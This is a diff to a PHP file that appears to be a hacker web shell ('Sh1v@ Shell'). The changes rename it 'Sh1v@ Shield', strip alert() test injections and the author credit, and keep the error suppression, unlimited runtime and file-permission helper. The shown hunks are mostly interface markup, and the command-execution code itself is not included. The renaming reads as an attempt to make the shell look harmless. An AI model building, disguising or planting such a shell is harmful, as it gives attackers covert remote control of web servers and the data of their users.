@@ -1,8 +1,7 @@
-﻿
+
 <?php
 set_time_limit(0);
 error_reporting(0);
-
 if(get_magic_quotes_gpc()){
 foreach($_POST as $key=>$value){
 $_POST[$key] = stripslashes($value);
@@ -11,9 +10,8 @@ $_POST[$key] = stripslashes($value);
 echo '<!DOCTYPE HTML>
 <HTML>
 <HEAD>
-<script>alert(0)></script>
 <link href="" rel="stylesheet" type="text/css">
-<title>Sh1v@ Shell</title>
+<title>Sh1v@ Shield</title>
 <style>
 body{
 font-family: "Century Gothic", cursive;
@@ -56,7 +54,7 @@ border-radius:5px;
 
 <center><table>
 <tr><th>
-<img src="https://s-media-cache-ak0.pinimg.com/236x/95/14/52/9514523f8c5a9117ae22b2ae5348737b--freedom-fighters-silhouette.jpg" height=90 width=70 onload=alert("Welcome_to_Sh1v@_Shield")>
+<img src="https://s-media-cache-ak0.pinimg.com/236x/95/14/52/9514523f8c5a9117ae22b2ae5348737b--freedom-fighters-silhouette.jpg" height=90 width=70>
 </th><th><h1>Sh1v@ Shield</h1> Modified by Sh1vr@y</th>
 </tr></table>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
@@ -241,7 +239,7 @@ echo "</center></td>
 echo '</table>
 </div>';
 }
-echo '<br /><center>Sh1v@ Shield   <font color="red">1.0</font>, Coded By <font color="red">Sh1vr@y</font>
+echo '<br /><center>Sh1v@ Shield   <font color="red">1.0</font>
 </BODY>
 </HTML>';
 function perms($file){
